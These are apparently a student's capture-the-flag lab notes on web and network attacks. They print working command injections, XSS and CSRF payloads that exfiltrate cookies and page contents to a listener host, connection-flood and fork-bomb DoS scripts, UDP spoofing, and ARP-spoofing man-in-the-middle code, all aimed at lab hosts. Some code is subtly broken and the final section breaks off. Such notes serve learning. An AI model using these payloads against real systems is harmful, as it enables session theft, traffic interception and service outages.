# Web Security (Intro to Cyber Security) 

## Shell Injections

### Authentication Bypass
`http://challenge.localhost/?session_user=admin`

then setting it up via cookie

### Command Injections
`curl http://challenge.localhost:80/adventure?dir=.%3B%20cat%20%2Fflag`

things like these or chaining them with with other commands
`curl http://challenge.localhost:80/initiative?time-region=Hogwarts%3Bcat%20%2Fflag%3B`

here you can see that a different request allows me to chain the `cat flag` instruction

### Path Traversal
Did some basic traversal via the URL and to avoid the input sanitization used encoded to HTML 

### SQL Injections

Check for SQL Injections being possible
`1=1`

## XSS (Cross Site Scripting)

Stored XSS
  First two Challenges used Stored XSS, We just had to POST malicious code (in form of a JS script or HTML) via the input field required

  ``` html
    <script> alert("We can just have this exist on the website"); </script>
  ```

Reflected XSS
  In case of the Reflected XSS challenges we send the victim a malicious link that contains malicious code that then is executed by the victim on visiting the link

  *In challenge 4 we first had to ensure that we were not writing our XSS in a TextArea that was converting it to text so we first had to close the textbox*
  ``` html
    </textarea> <script> alert("whatever you want to write as the JS in place of alert") </script>
  ```

  *challenge 5 showed how XSS was usually used to fetch a request to publish the draft so we can see the flag*

  ``` html
    <script>
      window.onload = async function() {
        await fetch("http://challenge.localhost/publish", {
          method: "POST",
        });
      }
    </script>
  ```

  *in Challenge 7 the final challenge we have to retrieve the password of Admin via cookies*
  ``` html
    <script>
      let c = document.cookie;
    
      window.onload = async function() {
        await fetch("http://challenge.localhost:20000/?data=" + encodeURIComponent(c), {
          method: "GET",
          credentials: "include"
        });
      }
    </script>
  ```

  have NetCat listening for the request
  `nc -lvnp 20000`

  After getting the payload we curled into the website with cookie to set our session as admin

  Finally recieving the flag

## CSRF (Cross Site Request Forgery)
Essentially we have the victim redirect from a different website executing a script from that other website that performs an operation on the site that we intend to hack. In this case having the victim who's session is saved on the other site to leak the flag via accessing our site

Setup the site from which we will initiate our request on the same port

To set up the server we make a fake webpage for the victim to access, which then redirects to the other site to `http://challenge.localhost/publish`

```html
<!DOCTYPE html>
<html>
  <body onload="window.location='http://challenge.localhost/publish'"><body>
</html>
```

`evil site` set up via `python -m http.server 1337`

leading to the flag being leaked

*challenge 2, similar thing done for the second one*

*challenge 3*

This one took me longer due to the fact that the browser would parse </script> as the ending tag of the entire script instead of for the execution via the redirect. Had to redirect to the enpoint 'challenge.localhost/ephemeral?msg='

```html
<!DOCTYPE html>
<html>
  <h1> Loading... </h1>

  <script>
    var payload = "<scr" + "ipt>alert('PWNED')</scr" + "ipt>";
    window.location = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(payload);
  </script>
</html>
```

*challenge 4*
Need to Perform CSRF->XSS to fetch cookies


``` html
<!DOCTYPE html>
<html>
<body>
	<script>
		var p1 = "<scr";
		var p2 = "ipt>";
		var p3 = "fetch('http://hacker.localhost:1337/?cookie='.concat(encodeURIComponent(document.cookie)));";
		var p4 = "</scr";
		var p5 = "ipt>";
		
		var payload = p1.concat(p2,p3,p4,p5);
		window.location = "http://challenge.localhost/ephemeral?msg=".concat(encodeURIComponent(payload));
	</script>	
	<h1> loading... </h1>
</body>
</html>
```

after recieving cookie we set our auth to the cookie (after decoding it) and were able to login as the user

*challenge 5*
instead of retrieving the cookie we use fetch directly to get the flag content from the page

``` html
<!DOCTYPE html>
<html>
<body>
  <script>
    p1 = "<scr";
    p2 = "ipt>";
    p3 = "fetch('/').then(function(r){return r.text()}).then(function(d){fetch('http://hacker.localhost:1337/'.concat('?data=', encodeURIComponent(d)))})";
    p4 = "</scr";
    p5 = "ipt>";

    p = p1.concat(p2, p3, p4, p5);
    window.location = "http://challenge.localhost/ephemeral?msg=".concat(encodeURIComponent(p));
  </script>
  <h1> Loading... </h1>
</body>
</html>
```

After that we get the HTML Encoded data as a response that we then have to URL decode and from that data we can see the flag

*} is encoded as %7d*

# Intercepting Communication

*Connect*

`nc <ip> <port>`

*Scan*
Create a Shell Script that goes through all possible ports

``` sh
for i in $(seq 255); do
  timeout 1 ping -c 1 10.0.0.$i /dev/null 2>&1 && echo "IP 10.0.0.$i is up" 
done
```

*Scan 2*
Had to perform an `nmap` scan, The scan was to be done on on 10.0.0.0/16 subnet which means that we were scanning 65,536 ports. To do so we would need an efficient scan 

flags used:
  -Pn : Ping No (Skips host discovery)
  -n: no DNS resolution (no reverse lookups on every ip)
  -T5: Timing Template 5 (fastest, short timeouts)
  -min-rate 10000: send min 10000 packets/second

``` sh
  nmap -p 31337 -T5 -Pn -n --min-rate 1000 10.0.0.0/16 > pingslists.txt
```

*Monitor*
Just had to go through wireshark packets, the flag was contained in the byte data, if I was stuck I followed the TCP Conversation and was able to find the flag

*Sniffing Cookies*
We found the session cookie from inspecting the traffic using wireshark, then used curl to get to the `/flag` endpoint on ip `10.0.0.2` using an HTTP GET Request

``` sh
  curl -v --cookie "session: ______" http://10.0.0.2/flag
```

*Network Configuration*
This assumes knowledge gained from the video on Ethernet connection.

``` sh
  ip link set eth0
```

after that we ARP the ip addresses we want to see if we have a connection to,

``` sh
  ping 10.0.0.2
  ping 10.0.0.3
```

shows that connection to 10.0.0.3 is missing since no packets are recieved from ping to 10.0.0.3

``` sh
  ip addr show eth0
  ip addr add 10.0.0.3 eth0 
```

Expect such a response
``` sh
root@ip-10-0-0-1:~# ip addr add 10.0.0.3/24 dev eth0                     
root@ip-10-0-0-1:~# ip addr show eth0                                    
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000       link/ether de:65:ef:ae:05:ad brd ff:ff:ff:ff:ff:ff link-netnsid 0    
    inet 10.0.0.1/24 scope global eth0                                   
       valid_lft forever preferred_lft forever                           
    inet 10.0.0.3/24 scope global secondary eth0                        
       valid_lft forever preferred_lft forever                           
    inet6 fe80::dc65:efff:feae:5ad/64 scope link proto kernel_ll         
       valid_lft forever preferred_lft forever                           
root@ip-10-0-0-1:~# ping 10.0.0.3                                        
PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.                           
64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.038 ms                  
64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.047 ms                  
64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.046 ms                  
^C                                                                       
--- 10.0.0.3 ping statistics ---                                         
3 packets transmitted, 3 received, 0% packet loss, time 2056ms           
rtt min/avg/max/mdev = 0.038/0.043/0.047/0.004 ms                        
root@ip-10-0-0-1:~# nc -lvnp 31337                        
```

then we set our listener
``` sh
  nc -lvnp 31337
```

*FireWall*
``` sh
  iptables -A INPUT -p tcp --dport 31337 -j DROP
```

*Denial Of Service*
Probably one of the most fun tasks we have had in this module, had to figure out how to put enough load to terminate the connection between 10.0.0.3 and 10.0.0.2 on port 31337

``` sh
for i in {1..500}; do (while true; do nc 10.0.0.2 31337; done) & done
```

this worked but now the victim now limits each process to last 1 second (each connection creates a new process) in the latest challenge


we create processes faster than they can shutdown exeeding maximum processes possible (fork rate) until the service becomes unavailable.

This is called a **fork bomb** done via process exhaustion

``` sh
while true; do
    for i in {1..100}; do
        (nc 10.0.0.2 31337 &) 2>/dev/null
    done
    sleep 0.1
done
```

in this case we were using way too many resources on our own computer as well so in place of this we won't use a fork bomb and I will write the script with python so that we can have one process handle all these connections atleast on our side, the server can deal with creating forks of connections and kill itself.

``` python
import socket, time

ok = fail = 0
socks = []

def flood():
  while True:
    try:
      s = socket.socket()
      s.settimeout(0.9)
      s.connect(("10.0.0.2", 31337))
      socks.append(s)
      ok += 1
      socks.remove(s)
      s.close()
    except:
      fail += 1

threads = 1000
for i in range(threads):
  threading.Thread(target=flood, daemon=True).start()

while True:
  time.sleep(1)
  print(f"fail {fail} success {ok}")
  print(f"concurrent {len(socks)}")
```

it takes a while and expends a lot of resources on our end as well but eventually it kills the damn thing

*Ethernet*
Using Scapy to write a layer 2 (Data Link Layer) Socket, aka **Raw Socket**

`Ether().display()` should give us the arguments required to send Ethernet packet
Requiring a src, dst and type 

>>> Ether().display()
###[ Ethernet ]###
  dst       = None
  src       = 00:00:00:00:00:00
  type      = 0x9000

Ethernet type is 0xFFFF
need MAC address of IPV4 10.0.0.2

to find MAC address I pinged 10.0.0.2 then ran `arp -n`

Scapy Script
``` python
from scapy.all import *

packet = Ethernet(src="de:d3:5d:3b:44:f9", dst="ff:ff:ff:ff:ff", type=0xFFFF)
sendp(packet, iface="eth0")
```

*IP*

IP is handled on Layer 3 (Network Layer)

`IP().display()` executed from python REPL after `from scapy.all import *`

```
>>> IP().display()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = hopopt
  chksum    = None
  src       = 127.0.0.1
  dst       = 127.0.0.1
  \options   \
```

``` py
from scapy.all import *

packet = IP(src="10.0.0.1", dst="10.0.0.2", proto=0xFF)
send(packet, iface="eth0")
```

here we used send since we need to send this on Network Layer (Layer 3)

*TCP*

We know that TCP is sent on Layer 4 (Transport Layer) 

```
>>> TCP().display()
###[ TCP ]###
  sport     = ftp_data
  dport     = http
  seq       = 0
  ack       = 0
  dataofs   = None
  reserved  = 0
  flags     = S
  window    = 8192
  chksum    = None
  urgptr    = 0
  options   = []
```

we send the IP by using IP packet and a `/` composition operator (stacks/nests protocols inside each other)

FLAGS: A(ack), P(push), R(reset), S(syn), F(fin)

``` python
from scapy.all import *

packet = IP(dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF") 
send(packet, iface="eth0")
```

*TCP Handshake*

perform the SYN-ACK-SYNACK

``` python
from scapy.all import *

# Send SYN and get response
response = sr1(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31337, flags="S"), timeout=2, iface="eth0")

if response:
    # Send ACK to complete handshake
    send(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31338, ack=response.seq + 1, flags="A"), iface = "eth0")
    print("TCP Handshake completed!")
else:
    print("No SYN-ACK received")
```

*UDP*

I have done this with C++ already all too often, looking thru the challenge showed us we needed port 31338 to be source

using `socket` package

``` python
import socket

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

SOURCE_PORT = 31337
sock.bind(("10.0.0.2", 31338))

# Send message to 10.0.0.2:31337
message = "Hello, World!\n"
sock.sendto(message.encode(), ("10.0.0.2", 31337))

# Response
try:
    data, addr = sock.recvfrom(1024)
    print(f"Response: {data.decode()}")
except socket.timeout:
    print("No response received")

sock.close()
```

*UDP Spoofing*

We can see from `cat /challenge/run`

that **10.0.0.3** is a trusted ip, and that "FLAG" Message triggers the flag from server, we impersonate the trusted IP as the server has no way of ensuring that we are the Trusted connection

``` python
import socket
from scapy.all import *

packet = IP(dst="10.0.0.2", src="10.0.0.3") / UDP(sport=31337, dport=31338) / b"FLAG"
response = sr1(packet, timeout=2, verbose=True)

if response:
    print("recvd")
    response.show()
else:
    print("non ;(")
```

*UDP Spoofing 2*
we have to perform UDP Amplification which I is a replay attack, we use destination server as the amplifier to DDOS the victim server, in this case we act as the victim server by setting source port to `10.0.0.3` then in message we ask to respond to our ip `10.0.0.1`

``` python
from scapy.all import *

# Spoof response from Server (10.0.0.3) to Client (10.0.0.2)
# Tell Client to send flag to YOUR IP (10.0.0.1) on port 31338
flag_redirect = b"FLAG:10.0.0.1:31338"

packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / flag_redirect

send(packet, verbose=True)
print("Sent spoofed FLAG redirect to client")
```

and we set a netcat listener to get the response

This challenge was using a method that was used in an exploit know as "BIND 9 DNS Cache Poisoning" which used the knowledge of port to provide a response to perform its namesake

The paper also references pharming attacks

"Pharming is a sophisticated cyber attack that redirects users from legitimate websites to fraudulent ones to steal sensitive information, often without the user's knowledge."

often by form of DNS Cache Poisoning to redirect victims to their IPs and redirect them to fraudulent websites

*UDP Spoof 3*

trying to bruteforce source port

``` python
from scapy.all import *
import socket
import threading
import time

# Setup flag listener
def listen_for_flag():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 31338))
    print("Listening for flag on port 31338...")
    data, addr = sock.recvfrom(1024)
    print(f"\n FLAG FOUND: {data.decode()}")
    sock.close()
    return data

# Start listener in background
listener_thread = threading.Thread(target=listen_for_flag, daemon=True)
listener_thread.start()

# Brute force source ports
print("Brute forcing source ports...")
for port in range(10000, 65535):
    packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=port) / b"FLAG:10.0.0.1:31338"
    send(packet, verbose=False)
    
    if port % 1000 == 0:
        print(f"Tried up to port {port}")

print("Brute force complete")
```

*ARP*

```
>>> ARP().display()
###[ ARP ]###
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = who-has
  hwsrc     = 00:00:00:00:00:00
  psrc      = 0.0.0.0
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
```

``` python
from scapy.all import *

packet = ARP(op=2, psrc="10.0.0.42", hwsrc="42:42:42:42:42:42", pdst="10.0.0.2")
send(packet, iface="eth0")
```

*Intercept*
Performing ARP spoofing to ensure that we impersonate an IP so that we can intercept the traffic, acting as a Man-In-The-Middle

``` python
from scapy.all import *
import time

my_mac = "96:26:8b:2a:2e:d6"

# ARP spoof (keep running)
def arp_spoof():
    pkt = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.3", hwsrc=my_mac, pdst="10.0.0.2")
    while True:
        sendp(pkt, verbose=False)
        time.sleep(1)

threading.Thread(target=arp_spoof, daemon=True).start()

# Handle SYN and respond with SYN-ACK
def handle_syn(pkt):
    if TCP in pkt and pkt[TCP].flags == 2:  # SYN only
        print(f"SYN from {pkt[IP].src}:{pkt[TCP].sport}")
        
        # Send SYN-ACK
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
                  seq=123456, ack=pkt[TCP].seq + 1, flags="SA")
        send(ip/tcp, verbose=False)
        print("SYN-ACK sent")

sniff(iface="eth0", filter="tcp port 31337 and tcp[13] & 2 != 0", prn=handle_syn, store=0)
```

*Man In The Middle*

We capture the packet from `10.0.0.2` and then relay to the ip `10.0.0.3` this final challenge requires the user to 

## DNS Cache Poisoning Vulnerabilities
see also:
  "birthday attack"
  "CNAME chaining"

[Paper Link](https://web.archive.org/web/20250417171505/https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=0c1e863b6698808b724def8793d7cba023494808)
